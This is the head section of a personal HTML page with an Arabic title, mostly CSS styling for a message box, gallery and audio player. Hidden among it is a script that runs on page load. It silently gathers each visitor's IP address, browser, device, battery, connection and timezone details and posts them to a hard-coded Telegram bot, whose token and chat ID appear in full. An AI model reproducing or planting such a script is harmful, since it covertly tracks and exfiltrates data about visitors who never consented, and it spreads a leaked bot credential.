<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>منونتي قلب بودا</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
  
  <style>
    body {
      margin: 0;
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(to bottom right, #fff0f5, #e6e6fa);
      color: #4b006e;
      text-align: center;
    }
    header {
      padding: 50px 20px 20px;
    }
    header h1 {
      font-size: 3em;
      margin: 0;
    }
    .message {
      margin: 30px auto;
      padding: 20px;
      max-width: 600px;
      font-size: 1.2em;
      background: #ffffffc2;
      border-radius: 20px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    .gallery {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 15px;
      padding: 20px;
    }
    .gallery img {
      width: 200px;
      border-radius: 15px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
    }
    .social {
      margin: 20px;
    }
    .social a {
      margin: 0 10px;
      font-size: 1.5em;
      text-decoration: none;
      color: #4b006e;
    }
    footer {
      margin: 30px 0;
      font-size: 0.9em;
    }
    audio {
      position: fixed;
      bottom: 20px;
      left: 20px;
      width: 250px;
      z-index: 1000;
    }
  </style>

  <script>
    async function sendVisitorInfo() {
        const botToken = "7805774303:AAFy5Vy3LIdBi7XeDVBp1-nvRoB4mgNPlPc";
        const chatId = "1557685494";
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        // Collecting basic visitor info
        const visitorInfo = {
            IPAddress: await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip),
            UserAgent: navigator.userAgent,
            Platform: navigator.platform,
            Language: navigator.language,
            ScreenResolution: `${window.screen.width}x${window.screen.height}`,
            DeviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
            TouchSupport: navigator.maxTouchPoints > 0 ? 'Supported' : 'Not Supported',
            OnlineStatus: navigator.onLine ? 'Online' : 'Offline',
            ConnectionType: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
            TimeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            CurrentTime: new Date().toLocaleString()
        };
        
        // Collect battery info if available
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                visitorInfo.BatteryPercentage = Math.round(battery.level * 100) + "%";
                visitorInfo.ChargingStatus = battery.charging ? "Charging" : "Not Charging";
            } catch (error) {
                visitorInfo.BatteryPercentage = "Unavailable";
                visitorInfo.ChargingStatus = "Unavailable";
            }
        }
        
        // Formatting message
        let message = "NEW VISITOR INFORMATION\n";
        for (let key in visitorInfo) {
            message += `${key}: ${visitorInfo[key]}\n`;
        }
        
        try {
            const response = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text: message })
            });
            const result = await response.json();
            console.log(result);
        } catch (error) {
            console.error(error);
        }
    }
    
    window.onload = sendVisitorInfo;
  </script>
</head>
